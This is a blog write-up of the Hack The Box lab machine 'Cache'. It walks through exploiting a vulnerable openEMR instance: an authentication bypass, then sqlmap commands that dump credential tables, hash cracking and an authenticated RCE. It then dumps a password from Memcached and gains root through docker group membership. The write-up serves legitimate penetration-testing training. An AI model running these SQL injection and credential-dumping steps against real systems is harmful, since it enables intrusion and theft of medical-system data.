<!DOCTYPE html><html lang="en" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>HackTheBox: Cache write-up | GoDiego</title><meta name="generator" content="Jekyll v4.0.1" /><meta property="og:title" content="HackTheBox: Cache write-up" /><meta name="author" content="Diego Bernal Adelantado" /><meta property="og:locale" content="en_US" /><meta name="description" content="Machine with different virtual hosts, one of them with a vulnerable openEMR instance. From there docker and Memcached are the way to root" /><meta property="og:description" content="Machine with different virtual hosts, one of them with a vulnerable openEMR instance. From there docker and Memcached are the way to root" /><link rel="canonical" href="https://diego95root.github.io/posts/Cache/" /><meta property="og:url" content="https://diego95root.github.io/posts/Cache/" /><meta property="og:site_name" content="GoDiego" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-06-11T00:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox: Cache write-up" /><meta name="twitter:site" content="@secfaults" /><meta name="twitter:creator" content="@Diego Bernal Adelantado" /> <script type="application/ld+json"> {"@type":"BlogPosting","headline":"HackTheBox: Cache write-up","dateModified":"2020-06-11T00:00:00+02:00","datePublished":"2020-06-11T00:00:00+02:00","url":"https://diego95root.github.io/posts/Cache/","mainEntityOfPage":{"@type":"WebPage","@id":"https://diego95root.github.io/posts/Cache/"},"author":{"@type":"Person","name":"Diego Bernal Adelantado"},"description":"Machine with different virtual hosts, one of them with a vulnerable openEMR instance. From there docker and Memcached are the way to root","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><meta name="twitter:image" content="/assets/img/favicons/favicon.ico" /><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><meta name="google-site-verification" content="H84_zouPIHmurw2-AF7oHrWvvqJ1HhxxPpp1B6Vjpx4" /><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/combine/npm/jquery@3.4.1,npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.4.1,npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" crossorigin="anonymous"></script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js" async crossorigin="anonymous"></script> <script src="/assets/js/dist/commons.js" async></script> <script src="/assets/js/dist/timeago.min.js" async></script><link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js"> <script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script> <script src="/assets/js/dist/toc.min.js" async></script> <script src="/assets/js/dist/tooltip-loader.min.js" async></script> <script src="/app.js" defer></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/favicons/logo.png" alt="avatar"> </a></div><div class="profile-text mt-3"><div id="site-title"> <a href="/">GoDiego</a></div><div id="site-subtitle" class="font-italic">Student, Bug Hunter, Security Enthusiast</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-3 mr-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-3 mr-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-3 mr-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/timeline/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-3 mr-3 unloaded"></i> <span>TIMELINE</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-3 mr-3 unloaded"></i> <span>ABOUT ME</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightkMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightkMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/diego95root" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/secfaults" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/diego-bernal-adelantado" target="_blank"> <i class="fab fa-linkedin"></i> </a> <a href="https://www.hackthebox.eu/home/users/profile/31531" target="_blank"> <i class="fas fa-cube"></i> </a> <a href=" javascript:window.open('mailto:' + ['diegobernal0905','gmail.com'].join('@'))" > <i class="fas fa-envelope"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HackTheBox: Cache write-up</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox: Cache write-up</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago" data-toggle="tooltip" data-placement="bottom" title="Thu, Jun 11, 2020, 12:00 AM +0200"> Jun 11, 2020 <i class="unloaded">2020-06-11T00:00:00+02:00</i> </span> by <span class="author"> Diego Bernal Adelantado </span></div><div> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Tue, Oct 20, 2020, 7:19 PM +0100"> Oct 20, 2020 <i class="unloaded">2020-10-20T20:19:16+02:00</i> </span></div></div><div class="post-content"> <img src="/assets/posts_details/Cache/images/header.png"><h1 id="hack-the-box-cache-machine-write-up">Hack The Box: Cache machine write-up</h1><p>We are back again with a new machine! Cache starts with a simple static website from which we get some hints that there is a virtual host. From there we find a vulnerable openEMR instance and can use an authentication flaw to exploit a SQLi. With that we access the database and crack some hashes to then gain RCE through another exploit that requires authentication. Once inside, enumeration leads to a Memcached server and we can extract the credentials from another user account, which is in the docker group so we can use a docker privilege escalation trick to get access to the filesystem.</p><p>Let’s dig in! The IP of the machine is <code class="highlighter-rouge">10.10.10.188</code>.</p><h2 id="enumeration">Enumeration</h2><p>I added <code class="highlighter-rouge">cache.htb</code> to my <code class="highlighter-rouge">/etc/hosts</code> file and started by enumerating open ports to discover the services running in the machine using nmap:</p><p><em>Result of nmap scan</em></p><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre># Nmap 7.70 scan initiated Wed Jun 10 10:28:54 2020 as: nmap -sV -sC -oA nmap/initial cache.htb
Nmap scan report for cache.htb (10.10.10.188)
Host is up (0.073s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)
|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)
|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Cache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 10 10:29:18 2020 -- 1 IP address (1 host up) scanned in 24.47 seconds
</pre></table></code></div></div><p>So not too much, just a web server.</p><h3 id="port-80-enumeration-cachehtb">Port 80 enumeration: <code class="highlighter-rouge">cache.htb</code></h3><p>At first sight it seems just a static page, so I started looking around and when I saw the login tab I went straight to it.</p><p><em>Main page</em></p><p><img src="/assets/posts_details/Cache/images/website.png" alt="Img" /></p><p><em>Login page</em></p><p><img src="/assets/posts_details/Cache/images/login.png" alt="Img" /></p><p>I guessed a few common username / password combinations but none worked. Then inspected the page source and to my surprise there was an odd script called <code class="highlighter-rouge">functionality.js</code> which contained credentials: <code class="highlighter-rouge">ash:H@v3_fun</code>.</p><p><em>Login page source</em></p><p><img src="/assets/posts_details/Cache/images/source.png" alt="Img" /></p><p><em>JS with hardcoded credentials</em></p><p><img src="/assets/posts_details/Cache/images/credentials1.png" alt="Img" /></p><p>Then I logged in and was directed to <code class="highlighter-rouge">login.html</code> but there was completely nothing! In fact, when trying to access <code class="highlighter-rouge">net.html</code> directly we could see that the page loaded but then we were redirected by javascript to <code class="highlighter-rouge">login.html</code> after doing some referrer check so the login mechanism could be entirely bypassed (not that it mattered as there was nothing).</p><p><em>Net.html page</em></p><p><img src="/assets/posts_details/Cache/images/net.png" alt="Img" /></p><p>At this point I checked the bruteforce results but found nothing… weird!</p><p><em>Bruteforcing files and directories</em></p><p><img src="/assets/posts_details/Cache/images/dirsearch1.png" alt="Img" /></p><p>I was a bit lost but then checked the author page and found something that gave me an idea: maybe there were some virtual hosts, as the description talked about a project: HMS (Hospital Management System).</p><p><em>Author description</em></p><p><img src="/assets/posts_details/Cache/images/author.png" alt="Img" /></p><p>So I tried with the most obvious one, <code class="highlighter-rouge">hms.htb</code>, and was redirected!</p><p><em>Discovering virtual hosts</em></p><p><img src="/assets/posts_details/Cache/images/hms.png" alt="Img" /></p><h3 id="port-80-enumeration-hmshtb">Port 80 enumeration: <code class="highlighter-rouge">hms.htb</code></h3><p><em>HMS host main page</em></p><p><img src="/assets/posts_details/Cache/images/hms1.png" alt="Img" /></p><p>I couldn’t login with the credentials I had so started a bruteforce attack and found several interesting directories, all of them having directory indexing enabled.</p><p><em>Bruteforcing files and directories</em></p><p><img src="/assets/posts_details/Cache/images/dirsearch2.png" alt="Img" /></p><p>I started looking at several directories and found nothing too interesting. I also found another login panel, this one under <code class="highlighter-rouge">/portal/</code>.</p><p><em>Patients portal</em></p><p><img src="/assets/posts_details/Cache/images/hms2.png" alt="Img" /></p><p>Once again my credentials didn’t work, so I tried registering a new user. However it wasn’t properly working so I figured this wasn’t the way to go.</p><p><em>Registration not working</em></p><p><img src="/assets/posts_details/Cache/images/hms3.png" alt="Img" /></p><p>At this point I simply googled <code class="highlighter-rouge">openEMR unauthenticated vulnerability</code> and bingo! One of the first results was a 28-page report made by Project Insecurity. On it, among others were a patient portal authentication bypass and several SQL injections.</p><p><em>Report contents</em></p><p><img src="/assets/posts_details/Cache/images/report.png" alt="Img" /></p><h2 id="openemr-exploitation">OpenEMR exploitation</h2><h3 id="patient-portal-authentication-bypass">Patient Portal Authentication Bypass</h3><blockquote><p>An unauthenticated user is able to bypass the Patient Portal Login by simply navigating tothe registration page and modifying the requested url to access the desired page.</p></blockquote><p>The root cause of this flaw is that the authentication mechanism is only checking if two variables, <code class="highlighter-rouge">pid</code> and <code class="highlighter-rouge">patient_portal_onsite_two</code> are set. And indeed they are set when starting the registration flow, which grants anyone access to authenticated functions and the code vulnerable to SQLi.</p><p><em>Accessing unauthenticated pages</em></p><p><img src="/assets/posts_details/Cache/images/unauth.png" alt="Img" /></p><p><img src="/assets/posts_details/Cache/images/unauth2.png" alt="Img" /></p><p>I noted down the openEMR version in case it was needed in the future: <code class="highlighter-rouge">5.0.1</code>.</p><h3 id="sql-injection">SQL injection</h3><p>The report mentions different pages where we can get the injection, I chose to use <code class="highlighter-rouge">/fin_appt_popup_user.php</code>.</p><p><em>Vulnerable page</em></p><p><img src="/assets/posts_details/Cache/images/sql1.png" alt="Img" /></p><p><img src="/assets/posts_details/Cache/images/sql2.png" alt="Img" /></p><p>After that I decided to automate my scan with <code class="highlighter-rouge">sqlmap</code>. One thing I needed to add was the cookie after visitng registration, otherwise the page would redirect to login. Here were the steps I took:s</p><ul><li>Get databases: <code class="highlighter-rouge">sqlmap -u 'http://hms.htb/portal/find_appt_popup_user.php?providerid=a&amp;catid=' --cookie='PHPSESSID=jb4g89dk1edakino2vq1qdhmtv' -p providerid --dbs</code>.</li></ul><p><em>Sqlmap working</em></p><p><img src="/assets/posts_details/Cache/images/sql3.png" alt="Img" /></p><p><img src="/assets/posts_details/Cache/images/sql4.png" alt="Img" /></p><ul><li>Enumerate the <code class="highlighter-rouge">openemr</code> database: <code class="highlighter-rouge">sqlmap -u 'http://hms.htb/portal/find_appt_popup_user.php?providerid=a&amp;catid=' --cookie='PHPSESSID=jb4g89dk1edakino2vq1qdhmtv' -p providerid -D openemr --tables</code>.</li></ul><p><em>Enumerated tables</em></p><p><img src="/assets/posts_details/Cache/images/sql5.png" alt="Img" /></p><ul><li><p>Got the table <code class="highlighter-rouge">users</code>: <code class="highlighter-rouge">sqlmap -u 'http://hms.htb/portal/find_appt_popup_user.php?providerid=a&amp;catid=' --cookie='PHPSESSID=jb4g89dk1edakino2vq1qdhmtv' -p providerid -D openemr -T users --columns</code></p></li><li><p>Got column names, so get data from them: <code class="highlighter-rouge">sqlmap -u 'http://hms.htb/portal/find_appt_popup_user.php?providerid=a&amp;catid=' --cookie='PHPSESSID=jb4g89dk1edakino2vq1qdhmtv' -p providerid -D openemr -T users -C id,username,mname,password --dump</code>.</p></li></ul><p><em>Retrieved credentials</em></p><p><img src="/assets/posts_details/Cache/images/sql6.png" alt="Img" /></p><p>However, the results weren’t as expected… None of the credentials seemed valid and indeed they weren’t working anywhere. I kept on searching and remembered seing a table named <code class="highlighter-rouge">users_secure</code>, so I took a look at it and found a hashed password belonging to <code class="highlighter-rouge">openemr_admin</code>.</p><p>The command I ran was: <code class="highlighter-rouge">sqlmap -u 'http://hms.htb/portal/find_appt_popup_user.php?providerid=a&amp;catid=' --cookie='PHPSESSID=jb4g89dk1edakino2vq1qdhmtv' -p providerid -D openemr -T users_secure -C id,username,salt,password --dump</code>.</p><p><em>Users_secure table data</em></p><p><img src="/assets/posts_details/Cache/images/sql7.png" alt="Img" /></p><h3 id="cracking-the-hash-and-gaining-rce">Cracking the hash and gaining RCE</h3><p>I googled a bit to try to find the encryption method used and found the following forum, <a href="https://community.open-emr.org/t/security-updates-for-user-password-scheme/6256">https://community.open-emr.org/t/security-updates-for-user-password-scheme/6256</a>, where they mention that it’s Blowfish. I cracked the hash using John.</p><p><em>Getting the password</em></p><p><img src="/assets/posts_details/Cache/images/hash.png" alt="Img" /></p><p>Now I had a valid account so I used searchsploit to find an authenticated RCE and quickly found one.</p><p><em>Getting RCE</em></p><p><img src="/assets/posts_details/Cache/images/rce.png" alt="Img" /></p><h2 id="privilege-escalation-i-user-pivoting">Privilege Escalation I: User pivoting</h2><p>This was an easy part, I saw there were two users: <code class="highlighter-rouge">ash</code> and <code class="highlighter-rouge">luffy</code>. I already had <code class="highlighter-rouge">ash</code>’s credentials so I tried them and to my surprise it worked! First I upgraded my shell to an interactive TTY:</p><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python3 -c 'import pty; pty.spawn("/bin/bash")'
</pre></table></code></div></div><p><em>Getting user</em></p><p><img src="/assets/posts_details/Cache/images/ash.png" alt="Img" /></p><h2 id="privilege-escalation-ii-pivoting-user-through-memcached-server">Privilege Escalation II: Pivoting user through Memcached server</h2><p>I started my usual enumeration with <code class="highlighter-rouge">LinEnum.sh</code>, as I only had a low-privileged shell as <code class="highlighter-rouge">www-data</code>. Couldn’t see anything too interesting so I thought of checking services running internally with <code class="highlighter-rouge">ss -lntu</code>.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="gp">ash@cache:~$</span><span class="w"> </span>ss <span class="nt">-lntu</span>
<span class="go">ss -lntu
Netid  State    Recv-Q   Send-Q      Local Address:Port      Peer Address:Port  
udp    UNCONN   0        0           127.0.0.53%lo:53             0.0.0.0:*     
tcp    LISTEN   0        80              127.0.0.1:3306           0.0.0.0:*     
tcp    LISTEN   0        128             127.0.0.1:11211          0.0.0.0:*     
tcp    LISTEN   0        128         127.0.0.53%lo:53             0.0.0.0:*     
tcp    LISTEN   0        128               0.0.0.0:22             0.0.0.0:*     
tcp    LISTEN   129      128                     *:80                   *:*     
tcp    LISTEN   0        128                  [::]:22                [::]:*
</span></pre></table></code></div></div><h3 id="how-memcached-works">How Memcached works</h3><blockquote><p>Memcached is an in-memory key-value store for small chunks of arbitrary data (strings, objects) from results of database calls, API calls, or page rendering.</p></blockquote><blockquote><p>The data in Memcached is organised in slabs, which are predetermined lists for objects of the same size. Given that all objects have a similar size memory fragmentation is reduced.</p></blockquote><h3 id="exploitation">Exploitation</h3><p>I tried to connect to the server via telnet and execute commands following this <a href="https://www.hackingarticles.in/penetration-testing-on-memcached-server/">post</a>:</p><ul><li><code class="highlighter-rouge">stats items</code>: returns all the data organised by slab ID (in our case we only have one).</li></ul><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre>STAT items:1:number 5
STAT items:1:number_hot 0
STAT items:1:number_warm 0
STAT items:1:number_cold 5
STAT items:1:age_hot 0
STAT items:1:age_warm 0
STAT items:1:age 14
STAT items:1:evicted 0
STAT items:1:evicted_nonzero 0
STAT items:1:evicted_time 0
STAT items:1:outofmemory 0
STAT items:1:tailrepairs 0
STAT items:1:reclaimed 0
STAT items:1:expired_unfetched 0
STAT items:1:evicted_unfetched 0
STAT items:1:evicted_active 0
STAT items:1:crawler_reclaimed 0
STAT items:1:crawler_items_checked 44
STAT items:1:lrutail_reflocked 0
STAT items:1:moves_to_cold 340
STAT items:1:moves_to_warm 0
STAT items:1:moves_within_lru 0
STAT items:1:direct_reclaims 0
STAT items:1:hits_to_hot 0
STAT items:1:hits_to_warm 0
STAT items:1:hits_to_cold 0
STAT items:1:hits_to_temp 0
</pre></table></code></div></div><ul><li><code class="highlighter-rouge">stats cachedump 1 0</code>: this command is used to dump data from a slab ID (<code class="highlighter-rouge">1</code>). The second argument is used to indicate how many keys to dump: in our case it’s <code class="highlighter-rouge">0</code>, which means dump everything.</li></ul><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>ITEM link [21 b; 0 s]
ITEM user [5 b; 0 s]
ITEM passwd [9 b; 0 s]
ITEM file [7 b; 0 s]
ITEM account [9 b; 0 s]
</pre></table></code></div></div><ul><li><code class="highlighter-rouge">get user</code>: used to fetch the value of the provided key.</li></ul><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>VALUE user 0 5
luffy
</pre></table></code></div></div><ul><li><code class="highlighter-rouge">get passwd</code>: same as above.</li></ul><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>VALUE passwd 0 9
0n3_p1ec3
</pre></table></code></div></div><p>Cool! So we managed to dump the credentials for the other user in the machine: <code class="highlighter-rouge">luffy:0n3_p1ec3</code>.</p><h2 id="privilege-escalation-iii-root-through-docker-misconfiguration">Privilege Escalation III: Root through docker misconfiguration</h2><p>Once as <code class="highlighter-rouge">luffy</code> I ran <code class="highlighter-rouge">LinEnum.sh</code> again and found that this user was part of the docker group.</p><p><em>LinEnum.sh output</em></p><p><img src="/assets/posts_details/Cache/images/docker1.png" alt="Img" /></p><p>When installing docker, documentation always warns to only add to the group trusted users. This is because users in the docker group can, among other things, mount the host entire filesystem in the docker container without being prompted for the root password. This is exactly what I did to gain root.</p><p><em>Root privilege escalation</em></p><p><img src="/assets/posts_details/Cache/images/root.png" alt="Img" /></p><p>This is everything, I hope you enjoyed the writeup and learned something new! If you liked it you can give me respect on Hack The Box through the following link: <a href="https://www.hackthebox.eu/home/users/profile/31531">https://www.hackthebox.eu/home/users/profile/31531</a>. Until next time!</p><hr /><p><em>Diego Bernal Adelantado</em></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack The Box</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hack-the-box/" class="post-tag no-text-decoration" >Hack The Box</a> <a href="/tags/pentesting/" class="post-tag no-text-decoration" >Pentesting</a> <a href="/tags/docker/" class="post-tag no-text-decoration" >Docker</a> <a href="/tags/memcached/" class="post-tag no-text-decoration" >Memcached</a> <a href="/tags/virtual-hosts/" class="post-tag no-text-decoration" >Virtual Hosts</a> <a href="/tags/sql/" class="post-tag no-text-decoration" >SQL</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox: Cache write-up - GoDiego&url=https://diego95root.github.io/posts/Cache/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox: Cache write-up - GoDiego&u=https://diego95root.github.io/posts/Cache/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HackTheBox: Cache write-up - GoDiego&url=https://diego95root.github.io/posts/Cache/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://diego95root.github.io/posts/Cache/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 